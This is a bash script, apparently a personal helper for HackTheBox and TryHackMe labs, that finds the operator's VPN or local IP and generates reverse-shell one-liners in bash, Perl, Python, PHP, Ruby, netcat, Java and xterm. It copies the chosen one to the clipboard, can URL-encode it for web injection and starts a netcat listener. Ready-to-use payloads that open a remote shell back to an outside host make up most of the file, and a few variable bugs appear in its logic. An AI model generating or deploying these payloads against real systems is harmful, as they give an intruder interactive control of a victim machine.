#!/bin/bash

#command to grep the tun0 ip(htb or thm virtual ip)



error=$(cat /sys/class/net/tun0/operstate 2>/dev/null)
e=0
interface=0
local=0

for (( i = 0; "$error" == "unknown" ; i++ )) 
do
  
  error=$(cat /sys/class/net/tun$i/operstate 2>/dev/null)
  
  if [ "$error" != "unknown" ]
  then
    break
  fi
  e=$((e+1))
done








pt=1234
x=0 

PURPLE="35"
BLUE="34"
ENDCOLOR="\e[0m"
BOLDPURPLE="\e[1;${PURPLE}m"
BOLDBLUE="\e[1;${BLUE}m"

urlencode() {
    # urlencode <string>

    local length="${#1}"
    for (( i = 0; i < length; i++ )); do
        local c="${1:i:1}"
        case $c in
            [a-zA-Z0-9.~_-]) printf "$c" ;;
            *) printf '%s' "$c" | xxd -p -c1 |
                   while read c; do printf '%%%s' "$c"; done ;;
        esac
    done
}

die() {
	printf '%s\n' "$1" >&2
	exit 1
}

setip(){
	
    if [ $e -gt 0 ]
	then
		for (( i = 0; i < $e ; i++ )); do
			
			ip4=$(/sbin/ip -o -4 addr list tun$i | awk '{print $4}' | cut -d/ -f1 )
			check=$(/sbin/ip -o -4 addr list tun$i | awk '{print $4}' | cut -d/ -f1 | cut -b 1-5)
			if [ "$check" == "10.2." ]
			then
				thmip=$ip4
				
			elif [ "$check" == "10.10" ]
			then
				htbip=$ip4
				
			else 
				unknown$i=$ip4
			fi
		done
		ip4=$(/sbin/ip -o -4 addr list tun0 | awk '{print $4}' | cut -d/ -f1)
	else
		ip4=$(/sbin/ip -o -4 addr list eth0 | awk '{print $4}' | cut -d/ -f1)
	fi
}

assignip(){
	





if [ "$local" == "0" ]
then
if [ $e -gt 1 ] && [ "$interface" == "0" ]
then
	echo -e "Looks like you are connected to multiple virtual network"
	if [ thmip ] && [ htbip ]
		then
			echo "Which ip you want to use"
			echo "1. THM: $thmip"
			echo "2. HTB: $htbip"

			
			read customip
			if [ "$customip" == "1" ] || [ "$customip" == "THM" ] || [ "$customip" == "thm" ]
				then
					ip4=$thmip
				elif [ "$customip" == "2" ] || [ "$customip" == "HTB" ] || [ "$customip" == "htb" ]
					then
						ip4=$htbip
				else
					echo "please choose from the given options"
			fi

			
		elif [ htbip ]
			then

				echo "Using HTB IP..."
				ip4=$htbip
		elif [ thmip ]
			then

				echo "Using thm ip"
				ip4=$thmip
	fi
elif [ "$interface" == "1" ]
	then
		ip4=$(/sbin/ip -o -4 addr list $inter | awk '{print $4}' | cut -d/ -f1)
fi
elif [ "$local" == "1" ]
	then
		ip4=$(/sbin/ip -o -4 addr list eth0 | awk '{print $4}' | cut -d/ -f1)
fi
echo "fina ip assigned is $ip4"
}

assign() {
	
	assignip



bash="bash -i >& /dev/tcp/$ip4/$pt 0>&1"

perl="perl -e 'use Socket;$i=\"$ip4\";$p=$pt;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"

python="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip4\",$pt));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

php="php -r '$sock=fsockopen(\"$ip4\",$pt);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

ruby="ruby -rsocket -e'f=TCPSocket.open(\"$ip4\",$pt).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"

nc="nc -e /bin/sh $ip4 $pt"

java="r = Runtime.getRuntime()
p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$ip4/$pt;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])
p.waitFor() "

xterm="xterm -display $ip4:1"




if [ "$rev_shell" == "bash" ]
then
	rev_shell=$bash

elif [ "$rev_shell" == "python" ]
	then
		rev_shell=$python

elif [ "$rev_shell" == "php" ]
	then
		rev_shell=$php

elif [ "$rev_shell" == "nc" ]
	then
		rev_shell=$nc

elif [ "$rev_shell" == "ruby" ]
	then
		rev_shell=$ruby

elif [ "$rev_shell" == "perl" ]
	then
		rev_shell=$perl

elif [ "$rev_shell" == "java" ]
	then
		rev_shell=$Java

elif [ "$rev_shell" == "xterm" ]
	then
		rev_shell=$xterm
		echo -e "To use this shell you need to authorize the target to connect to you using : xhost +targetip \non you machine\n"

	
else
	echo not defined

fi



echo -e "Using IP: ${BOLDPURPLE}$ip4${ENDCOLOR} \n"
echo -e "Using Port: ${BOLDBLUE}$pt${ENDCOLOR} \n"
echo "Shell:"
echo -e "\e[1;38;5;220m$rev_shell${ENDCOLOR} \n"
echo -e "$rev_shell" | xclip -selection clipboard
}


options=' Available shells \n 1.Bash \n 2.Python \n 3.Php \n 4.Ruby \n 5.Perl \n 6.Java \n 7.nc \n 8.xterm'
help='Usage: ./shells.sh -s [shell type] -[flag] \n -h \t\t\t\t show help \n -s \t\t\t\t select a shell \n -v \t\t\t\t use virtual ip address \n -l \t\t\t\t use local ip address \n -u \t\t\t\t url encode the shell \n -p \t\t\t\t specify a port \n -x \t\t\t\t do not start a listener automatically \n -i \t\t\t\t choose custom interface \n -o \t\t\t\t show options/shells'




if [ "$1" == "" ]
then
	echo "No Options Specified, use -h for help"
fi


while :; do
       case $1 in
           -h|-\?|--help)
               echo -e "$help"    # Display a usage synopsis.
               exit
               ;;
           -o|--options)
				echo -e "$options"
				exit
				;;
           -l|--local)       # Takes an option argument; ensure it has been specified.
               
               local=1
               # echo "Using local ip address: $ip4"
               
               ;;

           -v|--virtual)
				

               if [ "$error" == "unknown" ]
				then

					ip4=$(/sbin/ip -o -4 addr list tun0 | awk '{print $4}' | cut -d/ -f1)
					# echo "Using virtual ip address: $ip4"
					
				else
					die 'ERROR:You are not connected to a virtual network'

				fi
               
               ;;
            -s|--shell)
				
				if [ "$2" ]
				then
					sh=1
					rev_shell="$2"
					shift
				else
					die 'ERROR: "--shell" requires a non-empty option argument.'
				fi
				;;

           -u|--url-encode)
				url=1
				

			   ;;
		   -p|--port)
				if [ "$2" ]
				then
					pt="$2"
					shift
				else
					printf 'Port not specified, using default port 1234 %s\n' >&2 
				fi

			   ;;
		   -x)
					x=1

			   ;;
		   -i)
				interface=1
				inter=$2
				
				shift
			   ;;
           --)              # End of all options.
               shift
               break
               ;;
           -?*)
               printf 'WARN: Unknown option (ignored): %s\n' "$1" >&2
               ;;
           *)               # Default case: No more options, so break out of the loop.
               break
       esac
   
       shift
   done





if [ $sh ]
then
	
	setip

	
	assign

	if [ $url ]
	then
		echo Url-encoded Shell:
		urlencode "$rev_shell"
		echo -e "\n"
			
	fi
	if [ "$x" == "0" ]
	then
		echo "Starting a listener on port: $pt"
		echo "---------------------------------"

		if [ "$rev_shell" == "xterm -display $ip4:1" ]
		then
			Xnest :1
		else
			nc -lnvp $pt
		fi
	fi
fi


